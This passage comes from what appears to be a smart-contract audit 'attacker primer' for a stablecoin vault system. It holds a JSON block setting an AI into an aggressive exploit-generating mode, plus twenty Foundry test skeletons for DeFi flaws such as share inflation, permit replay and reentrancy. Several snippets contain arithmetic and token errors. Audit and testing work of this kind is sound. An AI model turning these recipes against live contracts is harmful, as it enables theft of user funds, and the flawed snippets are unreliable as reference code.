  - Contains: function `testExploit_Detailed()` with clear setup, attack, and assertion
  - Must compile and run without external dependencies
  - Pass/fail output clearly indicates vulnerability

- [ ] **Forge Trace & Line Hits**
  - Command: `forge test --match testExploit --trace`
  - Output: `forge_trace.txt` showing call stack and line-by-line execution
  - Highlight: lines where state is mutated, external calls occur, assertions fail

- [ ] **Pre/Post Snapshots**
  - Balances (collateral, shares, debt) before and after exploit
  - Oracle prices before and after
  - Interest accrual state before and after
  - Format: Markdown table

- [ ] **Suggested Remediation (Code Snippet)**
  - File:line reference for vulnerable code
  - Proposed fix (3-5 lines of code)
  - Explanation of why fix addresses root cause
  - Example:
    ```solidity
    // File: contracts/Vault.sol:127-135
    // BEFORE:
    function deposit(uint256 amount) public {
        uint256 shares = (amount * totalShares) / totalAssets;
        _mint(msg.sender, shares); // UNSAFE: reenter here
        token.transferFrom(msg.sender, address(this), amount);
    }
    
    // AFTER:
    function deposit(uint256 amount) public nonReentrant {
        token.transferFrom(msg.sender, address(this), amount); // Transfer first
        uint256 shares = (amount * totalShares) / totalAssets;
        _mint(msg.sender, shares);
    }
    ```

- [ ] **Severity Justification**
  - **5/5 (Critical):** Arbitrary code execution, unbounded fund extraction, total insolvency
  - **4/5 (High):** Significant fund theft, system compromise, many users affected
  - **3/5 (Medium):** Partial fund theft, niche conditions, limited users
  - **2/5 (Low):** Theoretical vulnerability, requires multiple assumptions
  - **1/5 (Informational):** Gas optimization, style issue

- [ ] **Proof of Concept Summary**
  - One-liner impact: "Attacker can steal 50% of vault collateral via share price donation"
  - Preconditions: "Vault empty, attacker has 2000 tokens"
  - Step count: "4 transactions"

---

## Collaboration Protocol & Interaction Style

### JSON Snippet for Future Sessions

```json
{
  "model_mode": {
    "greeting": "Hello [Auditor Name], Monolith Attacker Primer v1.0 activated",
    "mindset": "attacker-first | invariant-driven | implementation-focused",
    "aggressive_mode": true,
    "style_rules": {
      "citations": "always include file:line-line references",
      "precision": "exact test names, pattern IDs, line numbers",
      "signal": "no fluff; each bullet adds attacker-grade value",
      "language": "command-and-control; give specific reproducible instructions"
    },
    "default_output_format": "Markdown | monolith-primer.md",
    "test_generation_prompt": "Generate Foundry unit tests targeting [PATTERN_ID]. Include setup, attack, assertion, damage metric. Return test template.",
    "exploit_generation_prompt": "Generate EXP-NNN exploit recipe targeting [VULNERABILITY]. Include TX sequence, preconditions, damage metric, code snippet.",
    "property_generation_prompt": "Generate property-based test (Echidna/Foundry) for [INVARIANT_ID]. Include fuzz setup, corpus seeds, invariant assertion."
  }
}
```

### Interaction Rules

1. **When asked "Generate test for PR-FAC-001":**
   - Return `test_factoryInitializerBypass()` function (Foundry-style)
   - Include setup, exploit call, assertion
   - Reference `contracts/Factory.sol:XX-YY`
   - Include damage metric: "Vault configured with LTV=0, borrow limit=0"

2. **When asked "Explain INV-013":**
   - Return one-liner invariant + formula
   - Why attacker cares: "Off-by-one HF threshold enables self-liquidation"
   - Test template + exploit link

3. **When asked "What's the most critical path?":**
   - Return top-3 patterns: PR-VAULT-001, PR-FAC-001, PR-REENT-001
   - Rationale: "Highest impact + lowest precondition friction"
   - Estimated time to exploit: "2–4 hours"

---

## Auto-Dedupe & Update Rules

### For Future Primer Evolution

**Rule 1: Duplicate Detection**
- If new pattern duplicates existing PR-XXX, tag as `DUPLICATE_OF(PR-XXX)`
- Merge high-signal additions into existing entry
- Increment version: v1.0 → v1.1

**Rule 2: New Vulnerability Ingest**
- New pattern gets next available ID: `PR-YYY`
- Add to Vulnerability Taxonomy section
- Link to relevant Invariant IDs
- Run test coverage check (ensure TST-FUZZ/TST-UNIT templates exist)

**Rule 3: Test Coverage Requirement**
- Every PR must have at least one test ID reference
- Every INV must have at least one exploit link
- Orphaned patterns are deleted (no value)

**Rule 4: Version Increment**
- Semantic versioning: MAJOR.MINOR
- v1.0 → v1.1 (bug fixes, clarifications, new test)
- v1.0 → v2.0 (major architecture change, new category section)

**Rule 5: Changelog Append**
```
## Latest Updates (Appended Each Version)

### v1.0 → v1.1 (Dec 2025)
- Added PR-FAC-020: Factory counterfactual collisions
- Expanded INV-019: TWAP freshness binding (added TST-SIM-008)
- Fixed EXP-001: Share donation test now uses reentrancy guard mock

### v1.0 (Dec 6, 2025)
- Initial release: 150 patterns, 50 invariants, 50 exploit templates
- Coverage: factory, vault, oracle, permission, reentrancy, token quirks
```

---

## Appendix: Quick Code Snippets (20 Foundry Test Skeletons)

### 1. First-Depositor Share Price Inflation
```solidity
function test_FirstDepositorShareInflation() public {
    // First depositor mints 1 share
    deal(collateral, attacker, 2000e18);
    vm.prank(attacker);
    collateral.approve(vault, 1e18);
    vault.deposit(1e18, attacker);
    assertEq(vault.balanceOf(attacker), 1e18);
    
    // Direct transfer (donation)
    vm.prank(attacker);
    collateral.transfer(vault, 1000e18);
    
    // Next depositor receives 0 shares
    deal(collateral, victim, 1000e18);
    vm.prank(victim);
    collateral.approve(vault, 1000e18);
    vault.deposit(1000e18, victim);
    assertEq(vault.balanceOf(victim), 0); // Rounding to zero
}
```

### 2. Oracle Inversion (Token/USD instead of USD/Token)
```solidity
function test_OracleInversion() public {
    // Mock inverted price: 1/ETH instead of ETH
    oracleMock.setPrice(1e18 / 2000e18); // 1/2000 instead of 2000
    
    // Deposit; LTV calc uses inverted price
    uint256 collateralValue = 1000e18 * (1e18 / 2000e18) / 1e18; // Should be 0.5
    assertEq(collateralValue, 0); // Undervalued
}
```

### 3. TWAP Window Spike
```solidity
function test_TWAPWindowSpike() public {
    // Advance blocks within TWAP window while price is spiked
    for (uint i = 0; i < 15; i++) {
        vm.roll(block.number + 1);
        priceOracle.recordPrice(basePrice * 105 / 100); // 5% spike
    }
    
    uint256 twap = priceOracle.getTWAP();
    assertEq(twap, basePrice * 105 / 100); // TWAP captured spike
}
```

### 4. Reentrancy in Interest Accrual
```solidity
function test_ReentrancyInAccrual() public {
    // ERC777 callback triggers during accrual
    vm.expectRevert("Reentrancy");
    vm.prank(attacker);
    vault.accrueInterest(); // Calls oracle; oracle callback reenters
}
```

### 5. Permit Replay (Missing ChainId)
```solidity
function test_PermitReplayAcrossChains() public {
    bytes32 hash = keccak256(abi.encode(...permit data without chainId...));
    (uint8 v, bytes32 r, bytes32 s) = sign(alice, hash);
    
    // On original chain
    vault.permit(alice, attacker, 1000, deadline, v, r, s);
    
    // Fork to different chain
    uint256 fork = vm.createFork("https://...");
    vm.selectFork(fork);
    
    // Same signature works on fork (BUG)
    vault.permit(alice, attacker, 1000, deadline, v, r, s);
}
```

### 6. Fee-on-Transfer Unaccounted
```solidity
function test_FeeOnTransferUnaccounted() public {
    uint256 depositAmount = 1000e6; // USDC
    deal(usdt, user, depositAmount);
    
    // USDT has 0.1% fee
    vault.deposit(depositAmount, user);
    // Vault receives 999.9e6; state records 1000e6
    
    vm.expectRevert("Insufficient balance");
    vault.withdraw(1000e6, user, user); // Fails; shortfall
}
```

### 7. Rounding to Zero on Small Deposit
```solidity
function test_RoundingToZeroSmallDeposit() public {
    // Inflate share price first
    oracleMock.setPrice(1000e18); // 1000x
    
    // Small deposit rounds to 0
    vm.prank(victim);
    vault.deposit(100, victim); // 100 wei
    assertEq(vault.balanceOf(victim), 0); // Rounding to 0
}
```

### 8. Liquidation Oracle Sandwich
```solidity
function test_LiquidationOracleSandwich() public {
    // Victim healthy at price $1
    uint256 healthBefore = vault.healthFactor(victim);
    assertGt(healthBefore, 1e18);
    
    // Attacker sandwiches: price update → liquidation
    oracleMock.setPrice(0.8e18); // Price drops 20%
    
    uint256 healthAfter = vault.healthFactor(victim);
    assertLt(healthAfter, 1e18); // Now liquidatable
    
    // Liquidation succeeds
    vault.liquidate(victim, 100e18);
}
```

### 9. Collateral Decimals Mismatch (6 vs 18)
```solidity
function test_CollateralDecimalsMismatch() public {
    // USDC has 6 decimals; vault assumes 18
    uint256 rawAmount = 1e6; // 1 USDC
    uint256 normalizedWrong = rawAmount / 10^12; // Wrong: division
    uint256 normalizedCorrect = rawAmount * 10^12; // Correct: multiply
    
    assertEq(normalizedWrong, 0); // Undervalued
    assertEq(normalizedCorrect, 1e18); // Correct
}
```

### 10. Interest Accrual Before State Update (CEI)
```solidity
function test_AccrualBeforeStateUpdateCEI() public {
    // accrueInterest() updates state, calls oracle, updates state again
    // Reentrancy during oracle call
    
    vm.expectRevert("Reentrancy"); // Or state should be consistent
    vault.deposit(1000e18, attacker);
    // During depositOracle callback: reenter to withdraw
}
```

### 11. Flash Loan Mint
```solidity
function test_FlashLoanMint() public {
    // Attacker calls vault.mint directly (should be private)
    vm.expectRevert("Unauthorized");
    vm.prank(attacker);
    vault.mint(attacker, 1000e18); // Direct mint without deposit
}
```

### 12. Deployer Fee Minting Unlimited
```solidity
function test_DeployerUnlimitedFeeMint() public {
    // Deployer can mint unlimited fees
    vm.prank(deployer);
    vault.mintFees(999999e18); // Huge amount
    
    // Deployer receives shares unbacked
    assertEq(vault.balanceOf(deployer), 999999e18);
}
```

### 13. Reentrancy Guard Missing
```solidity
function test_ReentrancyGuardMissing() public {
    // ERC777 callback allows reentrancy
    vm.prank(attacker);
    vault.deposit(1000e18, attacker);
    
    // During transfer callback, attacker reenters
    // reenter: withdraw(1000), balances double
    
    assertGt(vault.balanceOf(attacker), 1000e18); // Double counted
}
```

### 14. Health Factor Off-by-One
```solidity
function test_HealthFactorOffByOne() public {
    // HF = 105.0001%; liquidation threshold = 105%
    // Should not liquidate; but does (off-by-one)
    
    uint256 hf = 1050001; // 105.0001%
    uint256 threshold = 1050000; // 105%
    
    bool liquidatable = hf >= threshold; // BUG: should be >
    assertTrue(liquidatable); // Liquidates when should not
}
```

### 15. Missing Initialize Protection
```solidity
function test_InitializeReentry() public {
    // initialize() can be called twice
    
    vault.initialize(address(0), 0, attacker);
    
    // Second initialize overwrites params
    vault.initialize(address(1), 100, attacker);
    
    // Vault now uses address(1) as collateral
}
```

### 16. Proxy Storage Collision
```solidity
function test_ProxyStorageCollision() public {
    // Upgrade proxy; storage layout changes
    bytes32 slot0Before = vm.load(address(proxy), bytes32(0));
    
    proxy.upgradeTo(newImpl);
    
    bytes32 slot0After = vm.load(address(proxy), bytes32(0));
    assertNotEq(slot0Before, slot0After); // Storage corrupted
}
```

### 17. No Decimal Normalization
```solidity
function test_NoDecimalNormalization() public {
    uint8 decimals = 6; // USDC
    uint256 amount = 1e6;
    
    // Vault assumes 1e6 == 1e18 (BUG)
    uint256 valued = amount; // Should be amount * 1e12
    
    assertEq(valued, 1e6); // Undervalued by 1e12
}
```

### 18. Interest Rate Hyperinflation
```solidity
function test_InterestRateHyperinflation() public {
    uint256 debt = 1000e18;
    uint256 rate = 1e18; // 100% per block (extreme)
    uint256 blocks = 1000;
    
    // (1 + 1)^1000 overflows
    uint256 newDebt = debt * (2 ** 1000); // Overflow!
    
    assertLt(newDebt, debt); // Wrapped to small value
}
```

### 19. Missing Zero-Address Check
```solidity
function test_MissingZeroAddressCheck() public {
    // Deploy vault with collateral = address(0)
    
    vm.expectRevert(); // Should revert
    factory.createVault(address(0));
    
    // If not reverted, vault is bricked
}
```

### 20. Permit Nonce Not Incremented
```solidity
function test_PermitNonceNotIncremented() public {
    // Same permit signature used twice
    bytes32 hash = keccak256(abi.encode(...));
    (uint8 v, bytes32 r, bytes32 s) = sign(alice, hash);
    
    vault.permit(alice, attacker, 1000, deadline, v, r, s);
    nonce1 = vault.nonces(alice);
    
    // Replay same signature
    vault.permit(alice, attacker, 1000, deadline, v, r, s);
    nonce2 = vault.nonces(alice);
    
    assertEq(nonce1, nonce2); // BUG: nonce not incremented
}
```

---

## Footer & Version Control

**Monolith Stablecoin Attacker Primer — v1.0**

**Release Date:** December 6, 2025  
**Author:** Automated Researcher  
**Scope:** Over-collateralized stablecoin factory, interest-bearing vaults, autonomous rate controllers  
**Status:** Ready for production audits  

---

**Latest Update:**
- Initial release: 150+ vulnerability patterns, 50 critical invariants, 50 exploit templates, 20 test skeletons
- Coverage: factory initialization, vault accounting, interest accrual, oracle staleness, permission boundaries, reentrancy, ERC20 quirks, fee minting, TWAP manipulation, permit replay, storage collisions

**Next Release (v1.1 planned):**
- Cross-vault accounting patterns (multi-collateral migration)
- Liquidation reward manipulation (bonus vs penalty)
- Interest controller keeper delegation loopholes
- Additional L2-specific patterns (Arbitrum sequencer, Optimism precompiles)

---

**PRIMER_VERSION: 1.0**

**Token Increment:** `MONOLITH_PRIMER_v1_0_APPROVED`

---

*End of Monolith Stablecoin Attacker Primer — v1.0*
*This document is proprietary and intended for senior auditors and security researchers only.*
*Usage: Generate tests, stage attacks, validate invariants, and harden stablecoin deployments against adversarial actors.*
